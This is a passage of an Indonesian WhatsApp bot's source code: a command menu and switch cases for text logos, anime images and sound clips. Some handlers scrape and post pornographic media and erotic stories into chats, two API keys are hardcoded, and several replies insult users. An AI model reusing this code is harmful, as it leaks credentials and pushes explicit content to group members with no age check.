➤ ${prefix}nulis [ _teks_ ]
➤ ${prefix}matrix [ _teks_ ]
➤ ${prefix}breakwall [ _teks_ ]
➤ ${prefix}gneon [ _teks_ ]
➤ ${prefix}dropwater [ _teks_ ]
➤ ${prefix}flowertext [ _teks_ ]
➤ ${prefix}crosslogo [ _teks_ ]
➤ ${prefix}silktext [ _teks_ ]
➤ ${prefix}flametext [ _teks_ ]
➤ ${prefix}glowtext [ _teks_ ]
➤ ${prefix}smoketext [ _teks_ ]
➤ ${prefix}skytext [ _teks_ ]
➤ ${prefix}cslogo [ _teks_ ]
➤ ${prefix}lithgtext [ _teks_ ]
➤ ${prefix}crismes [ _teks_ ]
➤ ${prefix}tfire [ _teks_ ]
➤ ${prefix}sandw [ _teks_ ]
➤ ${prefix}epep [ _teks_ ]
➤ ${prefix}text3dbox [ _teks_ ]
➤ ${prefix}text3d
➤ ${prefix}qrencode (Qr Creator)
➤ ${prefix}barcode
➤ ${prefix}gtext
➤ ${prefix}logobp [ _teks_ ]
➤ ${prefix}leavest [ _teks_ ]
➤ ${prefix}thundertext [ _teks_ ]
➤ ${prefix}tlight [ _teks_ ]
➤ ${prefix}nulis [ _teks_ ]
➤ ${prefix}wolflogo [ _teks1 | teks2_ ]
➤ ${prefix}pubglogo [ _teks1 | teks2_ ]
➤ ${prefix}snowwrite [ _teks1 | teks2_ ]
➤ ${prefix}watercolour [ _teks1 | teks2_ ]
➤ ${prefix}logoaveng [ _teks1 | teks2_ ]
➤ ${prefix}phlogo [ _teks1 | teks2_ ]
➤ ${prefix}marvellogo [ _teks1 | teks2_ ]
➤ ${prefix}gtext [ _teks1 | teks2_ ]
➤ ${prefix}blackpink [ _teks_ ]
➤ ${prefix}neon [ _teks_ ]
➤ ${prefix}greenneon [ _teks_ ]
➤ ${prefix}futureneon [ _teks_ ]
➤ ${prefix}sandwriting [ _teks_ ]
➤ ${prefix}sandsummer [ _teks_ ]
➤ ${prefix}sandengraved [ _teks_ ]
➤ ${prefix}metaldark [ _teks_ ]
➤ ${prefix}neonlight [ _teks_ ]
➤ ${prefix}holographic [ _teks_ ]
➤ ${prefix}text1917 [ _teks_ ]
➤ ${prefix}minion [ _teks_ ]
➤ ${prefix}duluxesilver [ _teks_ ]
➤ ${prefix}newyearcard [ _teks_ ]
➤ ${prefix}bloodfrosted [ _teks_ ]
➤ ${prefix}halloween [ _teks_ ]
➤ ${prefix}jokerlogo [ _teks_ ]
➤ ${prefix}fireworksparkle [ _teks_ ]
➤ ${prefix}natureleaves [ _teks_ ]
➤ ${prefix}bokeh [ _teks_ ]
➤ ${prefix}toxic [ _teks_ ]
➤ ${prefix}strawberry [ _teks_ ]
➤ ${prefix}box3d [ _teks_ ]
➤ ${prefix}roadwarning [ _teks_ ]
➤ ${prefix}breakwall [ _teks_ ]
➤ ${prefix}icecold [ _teks_ ]
➤ ${prefix}luxury [ _teks_ ]
➤ ${prefix}cloud [ _teks_ ]
➤ ${prefix}summersand [ _teks_ ]
➤ ${prefix}horrorblood [ _teks_ ]
➤ ${prefix}thunder [ _teks_ ]
➤ ${prefix}magma [ _teks_ ]
➤ ${prefix}impressiveglitch [ _teks_ ]
➤ ${prefix}harrypotter [ _teks_ ]
➤ ${prefix}foggywindow [ _teks_ ]
➤ ${prefix}watercolor [ _teks_ ]
➤ ${prefix}wonderfullgraffiti [ _teks_ ]
➤ ${prefix}ssweb [ _teks_ ]

❏ 「 \`\`\`ASUPAN MENU\`\`\` 」

➤ ${prefix}asupan
➤ ${prefix}asupancecan
➤ ${prefix}asupanhijaber
➤ ${prefix}asupansantuy
➤ ${prefix}asupanukhti
➤ ${prefix}asupanbocil
➤ ${prefix}asupanghea
➤ ${prefix}asupanrika

❏ 「 \`\`\`ANIME MENU\`\`\` 」

➤ ${prefix}anime
➤ ${prefix}animesaran2
➤ ${prefix}animesaran
➤ ${prefix}neko
➤ ${prefix}rimuru
➤ ${prefix}wibu
➤ ${prefix}loli
➤ ${prefix}waifu
➤ ${prefix}husbu
➤ ${prefix}killua
➤ ${prefix}kurama
➤ ${prefix}rimuru
➤ ${prefix}tsunade
➤ ${prefix}narutoanime
➤ ${prefix}sagiri
➤ ${prefix}minato
➤ ${prefix}sakura
➤ ${prefix}nezuko
➤ ${prefix}hinata
➤ ${prefix}ppcp
➤ ${prefix}kaneki
➤ ${prefix}miku
➤ ${prefix}shinobu
➤ ${prefix}jiraya
➤ ${prefix}akira
➤ ${prefix}kurumi
➤ ${prefix}madara
➤ ${prefix}mikasa
➤ ${prefix}eren
➤ ${prefix}miku
➤ ${prefix}animerem

❏ 「 \`\`\`18+ & SOUND MENU\`\`\` 」

➤ ${prefix}cersex [_search_]
➤ ${prefix}hentai [_search_]
➤ ${prefix}nekoh
➤ ${prefix}bokep [_search_]
➤ ${prefix}asupanbokep
➤ ${prefix}sound 1 s/d 68
➤ ${prefix}sholawat
➤ ${prefix}araara
➤ ${prefix}baka
➤ ${prefix}susu
➤ ${prefix}sarange
➤ ${prefix}ngaji2
➤ ${prefix}tilawah
➤ ${prefix}pale
➤ ${prefix}menyukaiku
➤ ${prefix}hallo
➤ ${prefix}magic
➤ ${prefix}sowell
➤ ${prefix}beb

❏ 「 \`\`\`GACHA CECAN MENU\`\`\` 」

➤ ${prefix}vietnam
➤ ${prefix}korea
➤ ${prefix}china
➤ ${prefix}indonesia
➤ ${prefix}malaysia
➤ ${prefix}japan
➤ ${prefix}thailand`
but = [
                { buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 },
                { buttonId: 's&k', buttonText: { displayText: 'S&K' }, type: 1 }
                 ]
sendButLocation(from, menu, "©CREATED BY BAMBANG TRI RAHARJO", fakeimg, but, zer)
break
//Case All Menu
               case 'hentai':
                 
                 reply(mess.wait)
                buffer = await getBuffer(`https://api.dhamzxploit.my.id/api/nsfw/waifu`)
                const bpa = await zero.prepareMessage(from, buffer, MessageType.image)

            const buttnsn = [{buttonId:`${prefix + command}`,buttonText: {displayText: 'Next️'}, type: 1}]

            const ButonMesasges = {

            contentText: `_© By Bambang Tri Raharjo_`,

            buttons: buttnsn,

            footerText: `Klik Next Untuk Melanjutkan`,

            headerType: 4,

            imageMessage: bpa.message.imageMessage

            }

            await zero.sendMessage(from, ButonMesasges, MessageType.buttonsMessage, {quoted : zer})
                break
case 'bokep':
                if (args.length < 1) return reply('*Hayolo belom tobat🤣* *tobat bodoh dosa elu udah banyak itu*')
case 'bokep2':
try{
if(!isGroup)return reply('Di group aja ngentod!! Biar dosanya kesebar..')
reply(mess.wait)
boks = Date.now();
bok = await scrapper.pornvid()
bokt = `BOKEP

┬╗ Judul    : ${bok.hasil.title}
┬╗ Upload   : ${bok.hasil.upload}
┬╗ Views    : ${bok.hasil.views}
┬╗ Like     : ${bok.hasil.like}
┬╗ Dislike  : ${bok.hasil.dislike}
┬╗ Favorite : ${bok.hasil.favorite}
┬╗ Tag      : ${bok.hasil.tags}
┬╗ Source   : ${bok.hasil.source}`

sendMediaURL(from, "https://tikporntok.com/"+bok.hasil.thumb, bokt)
sendMediaURL(from, "https://tikporntok.com/"+bok.hasil.video, monospace(`Process ${((Date.now()-boks)/1000).toFixed(1)} Seconds`))
} catch (e){
console.log(e)
reply(e)
}
break
                 case 'sarange':
const home = fs.readFileSync('./mp3/Sarange.mp3')
zero .sendMessage(from, home, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break  
case 'susu':
const su = fs.readFileSync('./mp3/susu.mp3')
zero .sendMessage(from, su, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break 
case 'beb':
const beb = fs.readFileSync('./mp3/syg.mp3')
zero .sendMessage(from, beb, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break 
case 'tutuptime':
		if (!isRegistered) return reply(`daftar dlu om ketik .verify`)
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = zer.participant
zero.groupSettingChange (from, GroupSettingChange.messageSend, true);
}, timer)
break
case 'bukatime':
		if (!isRegistered) return reply(`daftar dlu om ketik .verify`)
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = zer.participant
zero.groupSettingChange (from, GroupSettingChange.messageSend, false);
}, timer)
break
case 'leavetime':
if (!isGroup) return reply(mess.only.group)
if (!isOwner && !zer.key.fromMe) return sticOwner(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
zero.groupLeave(from);
}, timer)
break
case 'baka':
const baka = fs.readFileSync('./mp3/baka.mp3')
zero .sendMessage(from, baka, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'araara':
const prii = fs.readFileSync('./mp3/AraAra.mp3')
zero.sendMessage(from, prii, MessageType.audio, {quoted:zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sowell':
const well = fs.readFileSync('./mp3/sowell.mp3')
zero .sendMessage(from, well, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break 
            case 'autorespon':
      if (!isOwner && !zer.key.fromMe) return sticOwner(from)
           if (c === 'on'){
              autorespon = false
                    reply(`Berhasil mengaktifkan autorespon`)
                } else if (c === 'off'){
                    autorespon = true
                    reply(`Berhasil menonaktifkan autorespon`)
                } else if (!c) {
                    anu =`Silahkan pilih salah satu\n\non: untuk mengaktifkan\noff: untuk menonaktifkan`
const buttons = [{buttonId: 'autorespon on', buttonText: {displayText: 'ON✔️'}, type: 1},{buttonId: 'autorespon off', buttonText: {displayText: 'OFF✖️'}, type: 1}]
const btnharam = {
    contentText: `${anu}`,
    footerText: '*_© Bambang Tri R_*',
    buttons: buttons,
    headerType: 1
}
await zero.sendMessage(from, btnharam, MessageType.buttonsMessage, {quoted: ftrol})
                }
                break
case 'tilawah':
const tilawah = fs.readFileSync('./mp3/tilawah.mp3')
zero.sendMessage(from, tilawah, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break 
case 'sholawat':
const nabi = fs.readFileSync('./mp3/sholawatnabi.mp3')
zero.sendMessage(from, nabi, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break 
case 'ngaji':
const ngaji1 = fs.readFileSync('./mp3/ngaji.mp3')
zero.sendMessage(from, ngaji1, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break 
case 'ngaji2':
const ngaji2 = fs.readFileSync('./mp3/ngaji2.mp3')
zero.sendMessage(from, ngaji2, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break 
case 'iri':
const irimp3 = fs.readFileSync('./mp3/iri.mp3');
zero.sendMessage(from, irimp3, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'pale':
const pa = fs.readFileSync('./mp3/pale.mp3')
zero.sendMessage(from, pa, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'hallo':
const hallo = fs.readFileSync('./mp3/hallo.mp3')
zero.sendMessage(from, hallo, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break 
case 'magic':
const magic = fs.readFileSync('mp3/magic.mp3')
zero.sendMessage(from, magic, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'menyukaiku':
const menyukaiku = fs.readFileSync('mp3/menyukaiku.mp3')
zero.sendMessage(from, menyukaiku, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound':
const soun = fs.readFileSync('./mp3/sound.mp3')
zero.sendMessage(from, soun, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break 
case 'sound1':
satu = fs.readFileSync('./mp3/sound1.mp3');
zero.sendMessage(from, satu, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound2':
dua = fs.readFileSync('./mp3/sound2.mp3');
zero.sendMessage(from, dua, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound3':
tiga = fs.readFileSync('./mp3/sound3.mp3');
zero.sendMessage(from, tiga, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound4':
empat = fs.readFileSync('./mp3/sound4.mp3');
zero.sendMessage(from, empat, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound5':
lima = fs.readFileSync('./mp3/sound5.mp3');
zero.sendMessage(from, lima, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound6':
enam = fs.readFileSync('./mp3/sound6.mp3');
zero.sendMessage(from, enam, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound7':
tujuh = fs.readFileSync('./mp3/sound7.mp3');
zero.sendMessage(from, tujuh, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break									
case 'sound8':
delapan = fs.readFileSync('./mp3/sound8.mp3');
zero.sendMessage(from, delapan, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound9':
sembilan = fs.readFileSync('./mp3/sound9.mp3');
zero.sendMessage(from, sembilan, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound10':
sepuluh = fs.readFileSync('./mp3/sound10.mp3');
zero.sendMessage(from, sepuluh, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound11':
sebelas = fs.readFileSync('./mp3/sound11.mp3');
zero.sendMessage(from, sebelas, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound12':
duabelas = fs.readFileSync('./mp3/sound12.mp3');
zero.sendMessage(from, duabelas, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound13':
tigabelas = fs.readFileSync('./mp3/sound13.mp3');
zero.sendMessage(from, tigabelas, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound14':
empatbelas = fs.readFileSync('./mp3/sound14.mp3');
zero.sendMessage(from, empatbelas, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound15':
limabelas = fs.readFileSync('./mp3/sound15.mp3');
zero.sendMessage(from, limabelas, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound16':
enambelas = fs.readFileSync('./mp3/sound16.mp3');
zero.sendMessage(from, enambelas, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound17':
tujuhbelas = fs.readFileSync('./mp3/sound17.mp3');
zero.sendMessage(from, tujuhbelas, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound18':
delapanbelas = fs.readFileSync('./mp3/sound18.mp3');
zero.sendMessage(from, delapanbelas, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound19':
sembilanbelas = fs.readFileSync('./mp3/sound19.mp3');
zero.sendMessage(from, sembilanbelas, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound20':
duapuluh = fs.readFileSync('./mp3/sound20.mp3');
zero.sendMessage(from, duapuluh, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound21':
duasatu = fs.readFileSync('./mp3/sound21.mp3');
zero.sendMessage(from, duasatu, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound22':
duadua = fs.readFileSync('./mp3/sound22.mp3');
zero.sendMessage(from, duadua, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound23':
duatiga = fs.readFileSync('./mp3/sound23.mp3');
zero.sendMessage(from, duatiga, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound24':
duaempat = fs.readFileSync('./mp3/sound24.mp3');
zero.sendMessage(from, duaempat, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound25':
dualima = fs.readFileSync('./mp3/sound25.mp3');
zero.sendMessage(from, dualima, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound26':
duaenam = fs.readFileSync('./mp3/sound26.mp3');
zero.sendMessage(from, duaenam, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound27':
duatujuh = fs.readFileSync('./mp3/sound27.mp3');
zero.sendMessage(from, duatujuh, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound28':
duadelapan = fs.readFileSync('./mp3/sound28.mp3');
zero.sendMessage(from, duadelapan, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound29':
duasembilan = fs.readFileSync('./mp3/sound29.mp3');
zero.sendMessage(from, duasembilan, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound30':
tigapuluh = fs.readFileSync('./mp3/sound30.mp3');
zero.sendMessage(from, tigapuluh, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound31':
tigasatu = fs.readFileSync('./mp3/sound31.mp3');
zero.sendMessage(from, tigasatu, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound32':
tigadua = fs.readFileSync('./mp3/sound32.mp3');
zero.sendMessage(from, tigadua, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound33':
tigatiga = fs.readFileSync('./mp3/sound33.mp3');
zero.sendMessage(from, tigatiga, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound34':
tigaempat = fs.readFileSync('./mp3/sound34.mp3');
zero.sendMessage(from, tigaempat, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound35':
tigalima = fs.readFileSync('./mp3/sound35.mp3');
zero.sendMessage(from, tigalima, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound35':
tigalima = fs.readFileSync('./mp3/sound35.mp3');
zero.sendMessage(from, tigalima, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound36':
tigaenam = fs.readFileSync('./mp3/sound36.mp3');
zero.sendMessage(from, tigaenam, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound37':
tigatujuh = fs.readFileSync('./mp3/sound37.mp3');
zero.sendMessage(from, tigatujuh, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound38':
tigadelapan = fs.readFileSync('./mp3/sound38.mp3');
zero.sendMessage(from, tigadelapan, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound39':
tigasembilan = fs.readFileSync('./mp3/sound39.mp3');
zero.sendMessage(from, tigasembilan, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound40':
empatpuluh = fs.readFileSync('./mp3/sound40.mp3');
zero.sendMessage(from, empatpuluh, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound41':
empatsatu = fs.readFileSync('./mp3/sound41.mp3');
zero.sendMessage(from, empatsatu, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound42':
empatdua = fs.readFileSync('./mp3/sound42.mp3');
zero.sendMessage(from, empatdua, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound43':
empattiga = fs.readFileSync('./mp3/sound43.mp3');
zero.sendMessage(from, empattiga, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound44':
empatempat = fs.readFileSync('./mp3/sound44.mp3');
zero.sendMessage(from, empatempat, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound45':
empatlima = fs.readFileSync('./mp3/sound45.mp3');
zero.sendMessage(from, empatlima, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound46':
empatenam = fs.readFileSync('./mp3/sound46.mp3');
zero.sendMessage(from, empatenam, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound47':
empattujuh = fs.readFileSync('./mp3/sound47.mp3');
zero.sendMessage(from, empattujuh, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound48':
empatdelapan = fs.readFileSync('./mp3/sound48.mp3');
zero.sendMessage(from, empatdelapan, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound49':
empatsembilan = fs.readFileSync('./mp3/sound49.mp3');
zero.sendMessage(from, empatsembilan, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound50':
limapuluh = fs.readFileSync('./mp3/sound50.mp3');
zero.sendMessage(from, limapuluh, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound51':
limasatu = fs.readFileSync('./mp3/Kecewa.mp3');
zero.sendMessage(from, limasatu, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound52':
limadua = fs.readFileSync('./mp3/Jarak.mp3');
zero.sendMessage(from, limadua, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound53':
limatiga = fs.readFileSync('./mp3/Bisa.mp3');
zero.sendMessage(from, limatiga, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound54':
limaempat = fs.readFileSync('./mp3/Disini.mp3');
zero.sendMessage(from, limaempat, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound55':
limalima = fs.readFileSync('./mp3/Batu.mp3');
zero.sendMessage(from, limalima, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'desah':
delapansatu = fs.readFileSync('./mp3/desahan4.mp3');
zero.sendMessage(from, delapansatu, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound56':
limaenam = fs.readFileSync('./mp3/Adanya.mp3');
zero.sendMessage(from, limaenam, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound57':
limatujuh = fs.readFileSync('./mp3/Pelangi.mp3');
zero.sendMessage(from, limatujuh, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound58':
limadelapan = fs.readFileSync('./mp3/sound58.mp3');
zero.sendMessage(from, limadelapan, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound59':
limasembilan = fs.readFileSync('./mp3/sound59.mp3');
zero.sendMessage(from, limasembilan, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound60':
enampuluh = fs.readFileSync('./mp3/sound60.mp3');
zero.sendMessage(from, enampuluh, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound61':
enamsatu = fs.readFileSync('./mp3/sound61.mp3');
zero.sendMessage(from, enamsatu, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound62':
enamdua = fs.readFileSync('./mp3/Sasageyo.mp3');
zero.sendMessage(from, enamdua, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound63':
enamtiga = fs.readFileSync('./mp3/Ternyata.mp3');
zero.sendMessage(from, enamtiga, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound64':
enamempat = fs.readFileSync('./mp3/Sayang.mp3');
zero.sendMessage(from, enamempat, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound65':
enamlima = fs.readFileSync('./mp3/chruch.mp3');
zero.sendMessage(from, enamlima, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound66':
enamenam = fs.readFileSync('./mp3/gemes.mp3');
zero.sendMessage(from, enamenam, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound67':
enamtujuh = fs.readFileSync('./mp3/darkside.mp3');
zero.sendMessage(from, enamtujuh, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
case 'sound68':
enamdelapan = fs.readFileSync('./mp3/Masih.mp3');
zero.sendMessage(from, enamdelapan, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
break
                 case 'ganteng':
					if (!isGroup) return reply(ind.groupo())
					membr = []
					const nus = groupMembers
					const msl = groupMembers
					const siapss = nus[Math.floor(Math.random() * nus.length)]
					const sipss = pushname[Math.floor(Math.random() * msl.length)]
					teks = `Yang paling Ganteng disini Adalah : @${siapss.jid.split('@')[0]}`
					membr.push(siapss.jid)
					mentions(teks, membr, true)
					break
                    case 'beban':
					  
					if (!isGroup) return reply(ind.groupo())
					membr = []
					const met = groupMembers
					const msd = groupMembers
					const siapsa = met[Math.floor(Math.random() * met.length)]
					const sipsd = pushname[Math.floor(Math.random() * msd.length)]
					teks = `Yang paling Beban disini Adalah : @${siapsa.jid.split('@')[0]}`
					membr.push(siapsa.jid)
					mentions(teks, membr, true)
					break
                    case 'cantik':
					  
					if (!isGroup) return reply(ind.groupo())
					membr = []
					const meo = groupMembers
					const msk = groupMembers
					const siaps = meo[Math.floor(Math.random() * meo.length)]
					const sips = pushname[Math.floor(Math.random() * msk.length)]
					teks = `Yang paling Cantik disini Adalah : @${siaps.jid.split('@')[0]}`
					membr.push(siaps.jid)
					mentions(teks, membr, true)
					break
case 'jadibot':
                if (args.length < 1) return reply('*Fitur Telah Di Hapus Oleh Owner Dikarenakan Banyak Yang spam Fitur Itu Kalo Mau jadi Bot ya Usaha Tololl Udah Numpang ngamok Lagi*')
                break
           case 'asupanbokep':
               if (!isOwner) return reply (mess.only.prem)
               reply(mess.wait)
               aprii = await getBuffer (`https://raku-web.herokuapp.com/api/bokep?apikey=${rakukey}`)
               zero.sendMessage(from, aprii, video, {mimetype: 'video/mp4', quoted: zer})
               break
case 'playmp3':

      if (args.length < 1) return reply("```JUDUL MANA TOT```")
      anu = await fetchJson(`https://api.dapuhy.ga/api/socialmedia/ytplaymp3?query=${args.join(' ')}&apikey=wf2tghNhfU`)
      reply(mess.wait)
      captionnya = `TITLE BERHASIL DISEBUTKAN\n\nJudul : ${anu.result.title}\nKualitas Video : ${anu.result.quality}\nViews : ${anu.result.views}\nSize : ${anu.result.size}\nChannel : ${anu.result.channel}\nDeskripsi : ${anu.result.desc}\n\n*MOHON TUNGGU BEBERAPA MENIT BOT SEDANG MENGIRIM AUDIO*`
buffer = await getBuffer (anu.result.thumb)
zero.sendMessage(from, buff, image, {quoted: zer, caption: captionnya})
miku = await getBuffer (anu.result.url)
zero.sendMessage(from, miku, audio, {mimetype: 'audio/mp4', quoted: zer})
break
case 'playmp4':

      if (args.length < 1) return reply("```JUDUL MANA TOT```")
      anu = await fetchJson(`https://api.dapuhy.ga/api/socialmedia/ytplaymp4?query=${args.join(' ')}&apikey=wf2tghNhfU`)
      reply(mess.wait)
      captionnya = `TITLE BERHASIL DIzerATKAN\n\nJudul : ${anu.result.title}\nKualitas Video : ${anu.result.quality}\nViews : ${anu.result.views}\nSize : ${anu.result.size}\nChannel : ${anu.result.channel}\nDeskripsi : ${anu.result.desc}\n\n*MOHON TUNGGU BEBERAPA MENIT BOT SEDANG MENGIRIM VIDEO*`
buffer = await getBuffer (anu.result.thumb)
zero.sendMessage(from, buff, image, {quoted: zer, caption: captionnya})
miku = await getBuffer (anu.result.url)
zero.sendMessage(from, miku, audio, {mimetype: 'audio/mp4', quoted: zer})
break
             case 'nekoh':
               
               reply(mess.wait)
                buffer = await getBuffer(`https://api.dhamzxploit.my.id/api/nsfw/neko`)
                const bc = await zero.prepareMessage(from, buffer, MessageType.image)

            const buttosn = [{buttonId:`${prefix + command}`,buttonText: {displayText: 'Next️'}, type: 1}]

            const ButonMessages = {

            contentText: `_© By Bambang Tri Raharjo_`,

            buttons: buttosn,

            footerText: `Klik Next Untuk Melanjutkan`,

            headerType: 4,

            imageMessage: bc.message.imageMessage

            }

            await zero.sendMessage(from, ButonMessages, MessageType.buttonsMessage, {quoted : zer})
                break
           case 'cersex':
					anu = await fetchJson(`https://raku-web.herokuapp.com/api/cersex?apikey=RakuKeyTod`)
					     anu1 = `*JUDUL* : ${anu.result.result.judul}\n`
               anu1 += `*LINK PHOTO* : ${anu.result.result.img}\n`
               anu1 += `*CERITA* : ${anu.result.result.cersex}\n` 
               reply(anu1)
               break
					break
case 'narutoanime':
  case 'kaneki':
    case 'shinomiya': 
      case 'kurama':
        case 'rimuru':
          case 'akira':
            case 'dazai': 
  
  case 'miku': 
  case 'mikasa':
  case 'eren': 
    case 'titan': 
  case 'levi': 
  case 'sakura':
  case 'hinata':
  case 'neji': 
                   case 'shinobu': 
                    
                     case 'kurumi': 
